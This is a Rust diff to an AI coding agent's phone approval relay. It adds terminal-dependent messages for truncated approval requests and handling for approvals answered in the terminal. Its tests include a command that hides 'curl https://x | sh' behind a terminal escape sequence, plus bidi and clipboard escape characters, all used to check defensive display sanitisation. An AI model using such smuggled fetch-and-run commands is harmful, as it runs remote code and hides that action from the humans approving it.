@@ -43,6 +43,15 @@ const TOO_MANY_RUNNING: &str =
 const RUNTIME_STOPPED: &str = "AGI Code stopped in this terminal. Start it there again.";
 const TASK_FAILED: &str = "The task failed in this terminal. Open it there to see why.";
 const NOT_SHARED: &str = "This folder starts Local or Your key sessions, and Remote Control shares only Managed ones. Start it in the terminal.";
+const HELD_FOR_THE_TERMINAL: &str =
+    "This request is too long to show on the phone. Allow it in the terminal, where all of it is shown.";
+const HELD_CUT_IN_THE_TERMINAL_TOO: &str =
+    "This change is too long to show on the phone. Allow it in the terminal, or deny it here.";
+const HELD_WITHOUT_A_TERMINAL: &str =
+    "This request is too long to allow from the phone. Deny it, or run the task in a terminal session.";
+const NOTE_FOR_THE_TERMINAL: &str = "Approve this in the terminal, where all of it is shown.";
+const NOTE_CUT_IN_THE_TERMINAL_TOO: &str = "Approve this in the terminal, or deny it here.";
+const NOTE_WITHOUT_A_TERMINAL: &str = "Deny it here, or run the task in a terminal session.";
 
 pub type Outgoing = (String, Value);
 
@@ -55,6 +64,7 @@ struct PendingApproval {
     risk_level: Value,
     reversible: Option<bool>,
     truncated: bool,
+    held: &'static str,
 }
 
 impl PendingApproval {
@@ -65,9 +75,15 @@ impl PendingApproval {
         kind: &str,
         risk_level: Value,
         reversible: Option<bool>,
+        terminal_approver: bool,
     ) -> Self {
-        let (summary, summary_cut) = clipped_for_approval(summary);
-        let (detail, detail_cut) = clipped_for_approval(detail);
+        let (note, held) = match (terminal_approver, leaves_change_lines_out(detail)) {
+            (false, _) => (NOTE_WITHOUT_A_TERMINAL, HELD_WITHOUT_A_TERMINAL),
+            (true, false) => (NOTE_FOR_THE_TERMINAL, HELD_FOR_THE_TERMINAL),
+            (true, true) => (NOTE_CUT_IN_THE_TERMINAL_TOO, HELD_CUT_IN_THE_TERMINAL_TOO),
+        };
+        let (summary, summary_cut) = clipped_for_approval(summary, note);
+        let (detail, detail_cut) = clipped_for_approval(detail, note);
         let truncated = summary_cut || detail_cut || leaves_change_lines_out(&detail);
         Self {
             turn_id,
@@ -80,6 +96,7 @@ impl PendingApproval {
             },
             reversible,
             truncated,
+            held,
         }
     }
 
@@ -101,17 +118,16 @@ fn leaves_change_lines_out(detail: &str) -> bool {
     })
 }
 
-fn clipped_for_approval(value: &str) -> (String, bool) {
+fn clipped_for_approval(value: &str, instead: &str) -> (String, bool) {
     let redacted = crate::secret_redaction::redact_tool_output(
-        &crate::terminal_text::sanitize_approval_text(value),
+        &crate::terminal_text::show_remaining_approval_controls(value),
     );
     let length = redacted.chars().count();
     if length <= MESSAGE_LENGTH {
         return (redacted, false);
     }
-    let note = |hidden: usize| {
-        format!("\n[{hidden} more characters are not shown here. Approve this in the terminal, where all of it is shown.]")
-    };
+    let note =
+        |hidden: usize| format!("\n[{hidden} more characters are not shown here. {instead}]");
     let kept = MESSAGE_LENGTH.saturating_sub(note(length).chars().count());
     (
         format!("{}{}", clip_head(&redacted, kept), note(length - kept)),
@@ -158,6 +174,7 @@ pub struct CodeHost<H: DeveloperSessionHost> {
     dispatches: Vec<DispatchedTask>,
     phone_starts: std::collections::VecDeque<std::time::Instant>,
     phone_threads: std::collections::HashSet<String>,
+    terminal_approver: bool,
 }
 
 fn clip_tail(value: &str, limit: usize) -> String {
@@ -257,7 +274,13 @@ impl<H: DeveloperSessionHost> CodeHost<H> {
             dispatches: Vec::new(),
             phone_starts: std::collections::VecDeque::new(),
             phone_threads: std::collections::HashSet::new(),
+            terminal_approver: false,
         }
+    }
+
+    pub fn with_terminal_approver(mut self, attached: bool) -> Self {
+        self.terminal_approver = attached;
+        self
     }
 
     fn start_refusal(&mut self) -> Option<&'static str> {
@@ -426,6 +449,7 @@ impl<H: DeveloperSessionHost> CodeHost<H> {
             return Vec::new();
         }
         let mut out = Vec::new();
+        let terminal_approver = self.terminal_approver;
         match self.host.reconnect_thread(params).await {
             Ok(reconnected) => {
                 let state = self.threads.entry(thread_id.to_string()).or_default();
@@ -445,6 +469,7 @@ impl<H: DeveloperSessionHost> CodeHost<H> {
                                     serde_json::to_value(approval.risk_level)
                                         .unwrap_or(Value::Null),
                                     approval.reversible,
+                                    terminal_approver,
                                 ),
                             );
                         }
@@ -793,7 +818,7 @@ impl<H: DeveloperSessionHost> CodeHost<H> {
                         "type": "approval-held",
                         "requestId": request_id,
                         "status": "refused",
-                        "message": "This request is too long to show on the phone. Allow it in the terminal, where all of it is shown.",
+                        "message": approval.held,
                     }),
                 )
                 .into_iter()
@@ -1018,6 +1043,30 @@ impl<H: DeveloperSessionHost> CodeHost<H> {
                 .get("type")
                 .and_then(Value::as_str)
                 .unwrap_or_default();
+            if kind == "approval-resolved" {
+                let Some(request_id) = text(event, "approvalId") else {
+                    return Vec::new();
+                };
+                let approved = matches!(
+                    event.get("decision").and_then(Value::as_str),
+                    Some("approved" | "approved-for-session")
+                );
+                let settled = self
+                    .threads
+                    .get_mut(&thread_id)
+                    .and_then(|state| state.pending_approvals.remove(&request_id))
+                    .is_some();
+                if !settled {
+                    return Vec::new();
+                }
+                return self
+                    .event(
+                        &thread_id,
+                        json!({ "type": "approval-answered", "requestId": request_id, "approved": approved }),
+                    )
+                    .into_iter()
+                    .collect();
+            }
             if kind == "turn-diff" {
                 let diff = crate::secret_redaction::redact_tool_output(
                     &text(event, "unifiedDiff").unwrap_or_default(),
@@ -1155,6 +1204,7 @@ impl<H: DeveloperSessionHost> CodeHost<H> {
                     &text(params, "kind").unwrap_or_default(),
                     params.get("riskLevel").cloned().unwrap_or(Value::Null),
                     params.get("reversible").and_then(Value::as_bool),
+                    self.terminal_approver,
                 );
                 self.threads
                     .entry(thread_id.clone())
@@ -1537,6 +1587,10 @@ mod tests {
     }
 
     fn code_host(host: &Arc<IdleAfterAbsence>) -> CodeHost<IdleAfterAbsence> {
+        headless_code_host(host).with_terminal_approver(true)
+    }
+
+    fn headless_code_host(host: &Arc<IdleAfterAbsence>) -> CodeHost<IdleAfterAbsence> {
         CodeHost::new(
             Arc::clone(host),
             "root".to_string(),
@@ -1833,7 +1887,7 @@ mod tests {
     }
 
     #[tokio::test]
-    async fn relayed_approval_text_shows_bidi_controls_and_drops_escapes() {
+    async fn relayed_approval_text_shows_every_control_and_drops_nothing() {
         let host = IdleAfterAbsence::running("turn-a");
         let mut code = code_host(&host);
         code.handle_control("code.session.attach", &control("r1", json!({})))
@@ -1847,9 +1901,33 @@ mod tests {
             .as_str()
             .expect("detail")
             .to_string();
-        assert!(detail.contains("ls <U+202E>hs.txt done"), "{detail}");
+        assert!(
+            detail.contains("ls <U+202E>hs.txt <U+001B>]52;c;"),
+            "{detail}"
+        );
+        assert!(detail.contains("<U+0007>done"), "{detail}");
         assert!(!detail.contains('\u{202E}'));
         assert!(!detail.contains('\u{1b}'));
+        assert!(!detail.contains('\u{7}'));
+    }
+
+    #[tokio::test]
+    async fn the_phone_sees_the_command_after_an_escape_introducer() {
+        let host = IdleAfterAbsence::running("turn-a");
+        let mut code = code_host(&host);
+        code.handle_control("code.session.attach", &control("r1", json!({})))
+            .await;
+        let request = command_request("true \u{1b}] ; curl https://x | sh ; \u{7}");
+
+        let out = code
+            .handle_notification(&relayed_by_the_terminal(&request))
+            .await;
+        let detail = requested_event(&out)["detail"].as_str().expect("detail");
+        assert!(detail.contains("curl https://x | sh"), "{detail}");
+        assert!(
+            detail.starts_with("true <U+001B>] ; curl https://x | sh ; <U+0007>"),
+            "{detail}"
+        );
     }
 
     #[tokio::test]
@@ -1885,7 +1963,192 @@ mod tests {
             )
             .await;
         assert_eq!(allowed[0].1["event"]["type"], "approval-held");
+        assert_eq!(
+            allowed[0].1["event"]["message"],
+            HELD_CUT_IN_THE_TERMINAL_TOO
+        );
         assert!(host.answered().is_empty());
+    }
+
+    fn change_requested(request_id: &str, detail: String) -> AppServerNotification {
+        AppServerNotification::new(
+            "approval/requested",
+            json!({
+                "threadId": THREAD,
+                "turnId": "turn-a",
+                "requestId": request_id,
+                "kind": "FileWrite",
+                "summary": "Allow this file write?",
+                "detail": detail,
+            }),
+        )
+        .expect("notification")
+    }
+
+    async fn phone_allows(code: &mut CodeHost<IdleAfterAbsence>, request_id: &str) -> Value {
+        code.handle_control(
+            "code.approval.respond",
+            &control(
+                "allow",
+                json!({ "approvalRequestId": request_id, "approved": true }),
+            ),
+        )
+        .await
+        .first()
+        .map(|(_, payload)| payload["event"].clone())
+        .expect("an answer to the phone")
+    }
+
+    #[tokio::test]
+    async fn a_long_change_the_terminal_also_cuts_never_claims_all_of_it_is_shown() {
+        use crate::tools::CHANGE_LINES_NOT_SHOWN;
+
+        let host = IdleAfterAbsence::running("turn-a");
+        let mut code = code_host(&host);
+        code.handle_control("code.session.attach", &control("r1", json!({})))
+            .await;
+        let lines: String = (0..400).map(|line| format!("+ line {line}\n")).collect();
+        let out = code
+            .handle_notification(&change_requested(
+                "approval-400",
+                format!("file: notes.txt\n{lines}\u{2026} 200 {CHANGE_LINES_NOT_SHOWN}"),
+            ))
+            .await;
+        let event = requested_event(&out);
+        assert_eq!(event["truncated"], true);
+        let detail = event["detail"].as_str().expect("detail");
+        assert!(detail.chars().count() <= MESSAGE_LENGTH);
+        assert!(!detail.contains("all of it is shown"), "{detail}");
+        assert!(detail.ends_with(&format!("{NOTE_CUT_IN_THE_TERMINAL_TOO}]")));
+
+        let held = phone_allows(&mut code, "approval-400").await;
+        assert_eq!(held["type"], "approval-held");
+        assert!(!held["message"]
+            .as_str()
+            .expect("message")
+            .contains("all of it is shown"));
+        assert!(host.answered().is_empty());
+    }
+
+    #[tokio::test]
+    async fn without_a_terminal_a_cut_request_can_only_be_denied_and_the_phone_is_told_so() {
+        let host = IdleAfterAbsence::running("turn-a");
+        let mut code = headless_code_host(&host);
+        code.handle_control("code.session.attach", &control("r1", json!({})))
+            .await;
+        let out = code
+            .handle_notification(&change_requested(
+                "approval-long",
+                format!("file: build.sh\n+ {}", "x".repeat(MESSAGE_LENGTH + 500)),
+            ))
+            .await;
+        let event = requested_event(&out);
+        assert_eq!(event["truncated"], true);
+        let detail = event["detail"].as_str().expect("detail");
+        assert!(detail.ends_with(&format!("{NOTE_WITHOUT_A_TERMINAL}]")));
+        assert!(!detail.contains("terminal, where"), "{detail}");
+
+        let held = phone_allows(&mut code, "approval-long").await;
+        assert_eq!(held["type"], "approval-held");
+        assert_eq!(held["status"], "refused");
+        assert_eq!(held["message"], HELD_WITHOUT_A_TERMINAL);
+        assert!(host.answered().is_empty());
+
+        let denied = phone_answer_id(&mut code, "approval-long", false).await;
+        assert_eq!(denied[0].1["event"]["type"], "approval-answered");
+        assert_eq!(host.answered(), vec!["approval-long".to_string()]);
+    }
+
+    async fn phone_answer_id(
+        code: &mut CodeHost<IdleAfterAbsence>,
+        request_id: &str,
+        approved: bool,
+    ) -> Vec<Outgoing> {
+        code.handle_control(
+            "code.approval.respond",
+            &control(
+                "answer",
+                json!({ "approvalRequestId": request_id, "approved": approved }),
+            ),
+        )
+        .await
+    }
+
+    fn status_of(out: &[Outgoing]) -> Value {
+        out[0].1["sessions"]
+            .as_array()
+            .expect("sessions")
+            .iter()
+            .find(|session| session["threadId"] == THREAD)
+            .map(|session| session["status"].clone())
+            .expect("the shared session")
+    }
+
+    #[tokio::test]
+    async fn an_approval_answered_in_the_terminal_clears_the_phones_card_and_cannot_be_answered_again(
+    ) {
+        let host = IdleAfterAbsence::running("turn-a");
+        host.finish_unseen();
+        let mut code = code_host(&host);
+        code.handle_control("code.session.attach", &control("r1", json!({})))
+            .await;
+        let workspace = tempfile::tempdir().expect("workspace");
+        let store = tempfile::tempdir().expect("store");
+        let inner = crate::app_server::CliDeveloperSessionHost::new_with_store(
+            crate::config::CliConfig::default(),
+            workspace.path().to_path_buf(),
+            crate::runtime::session_control::ManagedSessionStore::new(store.path().to_path_buf()),
+            false,
+        )
+        .expect("host");
+        let (terminal, _inbox) =
+            crate::tui::remote_host::TuiRemoteHost::new(inner, THREAD.to_string());
+        let mut events = terminal.subscribe();
+        terminal.begin_turn(
+            crate::tui::approval_broker::ApprovalBroker::new(),
+            Vec::new(),
+        );
+        let request = command_request(&format!("cat <<'EOF'\n{}\nEOF", "x".repeat(5_000)));
+        terminal.approval_requested(&request);
+        for notification in std::iter::from_fn(|| events.try_recv().ok()).collect::<Vec<_>>() {
+            code.handle_notification(&notification).await;
+        }
+        assert_eq!(status_of(&code.sessions().await), "awaiting_approval");
+        assert_eq!(
+            phone_answer(&mut code, &request, true).await[0].1["event"]["type"],
+            "approval-held"
+        );
+
+        terminal.approval_settled(
+            request.id,
+            crate::tui::approval_broker::ApprovalDecision::AllowOnce,
+        );
+        let mut out = Vec::new();
+        for notification in std::iter::from_fn(|| events.try_recv().ok()).collect::<Vec<_>>() {
+            out.extend(code.handle_notification(&notification).await);
+        }
+
+        let answered: Vec<&Value> = out
+            .iter()
+            .map(|(_, payload)| &payload["event"])
+            .filter(|event| event["type"] == "approval-answered")
+            .collect();
+        assert_eq!(answered.len(), 1);
+        assert_eq!(answered[0]["requestId"], request.id.to_string());
+        assert_eq!(answered[0]["approved"], true);
+        assert!(code.threads[THREAD].pending_approvals.is_empty());
+        assert_eq!(status_of(&code.sessions().await), "running");
+
+        assert!(phone_answer(&mut code, &request, false).await.is_empty());
+        assert!(host.answered().is_empty());
+
+        terminal.approval_settled(
+            request.id,
+            crate::tui::approval_broker::ApprovalDecision::AllowOnce,
+        );
+        assert!(std::iter::from_fn(|| events.try_recv().ok())
+            .next()
+            .is_none());
     }
 
     #[tokio::test]
